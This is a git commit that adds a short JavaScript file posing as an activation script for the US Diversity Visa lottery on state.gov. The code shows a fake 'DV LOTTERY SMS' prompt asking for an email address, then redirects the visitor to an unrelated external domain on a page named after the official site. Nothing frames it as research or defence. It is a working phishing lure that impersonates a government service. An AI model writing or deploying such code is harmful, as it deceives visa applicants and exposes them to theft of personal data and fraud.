38530d36e35ee6d313cf988ca62645c8d59e76c5
surprise24x7 <132287490+surprise24x7@users.noreply.github.com>
2025-01-20 21:33:49 +0530

    Create activation-dvlottery.state.gov.js

---
+++ activation-dvlottery.state.gov.js
@@ -0,0 +1,5 @@
+var password = 'APPLY NOW'
+password=prompt('DV LOTTERY SMS: Dear Applicant, kindly Enter Your E-mail Address And Apply For USA VISA LOTTERY, press APPLY NOW to check now ','APPLY NOW');
+if (password != 'APPLY NOW') {
+location.href='https://zaget.cc/dvlottery.state.gov.html';
+}
